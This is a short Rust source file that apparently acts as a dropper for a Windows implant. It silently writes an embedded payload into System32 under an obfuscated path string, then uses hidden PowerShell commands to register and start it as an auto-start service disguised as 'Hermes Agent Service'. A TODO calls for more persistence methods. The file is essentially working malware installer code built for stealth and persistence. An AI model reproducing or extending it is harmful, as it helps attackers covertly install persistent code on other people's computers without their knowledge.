#![windows_subsystem = "windows"]
use std::{fs, os::windows::process::CommandExt as _, process::Command};

pub const CREATE_NO_WINDOW: u32 = 0x08000000;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(unix)]
    {
        eprintln!("This platform is not supported");
        return;
    }

    fs::write(
        obfstr::obfstr!("C:\\Windows\\System32\\agent.exe"),
        include_bytes!(concat!(env!("OUT_DIR"), "/agentp")),
    )?;

    // Command::new("C:\\Windows\\System32\\agent.exe")
    //     .creation_flags(CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS | CREATE_NO_WINDOW)
    //     .spawn()?;

    // TODO Implement multiple persistence methods
    Command::new("powershell")
        .creation_flags(CREATE_NO_WINDOW)
        .arg("-Command")
        .arg("New-Service")
        .arg("-Name")
        .arg("'Agent'")
        .arg("-BinaryPathName")
        .arg("'C:\\Windows\\System32\\agent.exe'")
        .arg("-DisplayName")
        .arg("'Agent'")
        .arg("-StartupType")
        .arg("Automatic")
        .arg("-Description")
        .arg("'Hermes Agent Service'")
        .status()
        .expect("Failed to create service");
    Command::new("powershell")
        .creation_flags(CREATE_NO_WINDOW)
        .arg("-Command")
        .arg("Start-Service")
        .arg("-Name")
        .arg("'Agent'")
        .status()
        .expect("Failed to start service");
    Ok(())
}
